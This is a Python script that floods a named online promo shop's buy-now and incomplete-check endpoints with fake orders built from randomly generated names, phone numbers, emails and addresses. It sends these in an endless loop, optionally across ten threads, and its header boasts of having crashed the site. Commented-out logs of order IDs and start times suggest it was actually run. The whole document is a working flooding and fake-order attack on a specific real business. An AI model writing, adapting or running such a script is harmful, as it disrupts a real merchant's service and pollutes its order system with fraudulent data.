import requests
import random
from function import getFullName, randomNum, getCity, startThread, getEmail, getAdress

# -----------------------------------------------------  SUCCESSFULLY CRASHED THIS WEBSITE! ----------------------------------------------

url = 'https://www.acusteps-promo.com/cart/buynow'

# Website URL --------------- https://www.acusteps-promo.com/288605 -----------------------------

data = {
    "pid": 65,
    "campaign_uri": "288605",
    "order_data": ""
}

fullName = getFullName().replace(' ', '')
phone = randomNum(9)
city = getCity().replace(' ', '')
zip = random.randint(400, 9811)
email = getEmail()
address = getAdress(city)
data['order_data'] = f'courier_note=2%2B1+AcuSteps+-+%E2%82%B1+3%2C190.00&first_name={fullName}&address={address}&city={city}&email={email}&phone={phone}'

print(data['order_data'])


def start():
    sent = 1
    while True:
        data['order_data'] = f'courier_note=2%2B1+AcuSteps+-+%E2%82%B1+3%2C190.00&first_name={fullName}&address={address}&city={city}&email={email}&phone={phone}'
        res = requests.post(url,  data=data)
        print(res.text)
        # print('✅', sent, eval(res.text)['order_id_encoded'])
        # print(res.text)
        # else:
        #     print('❌', sent, 'ERROR: ||', res.status_code)
        sent += 1


# 24x2z2e4s2v2s2
# 1 Started at 24y2q274v2q2x2
# 2 started at 24y2q284s2r2s2
# 3 Started at 24y2q294v2z2q2
# startThread(10, start)

incoUrl = 'https://www.acusteps-promo.com/cart/incomplete_check'

req = requests.Session()

resp = req.post(incoUrl, data=data)


res = req.post(url, data)

print(res.text, res.status_code)
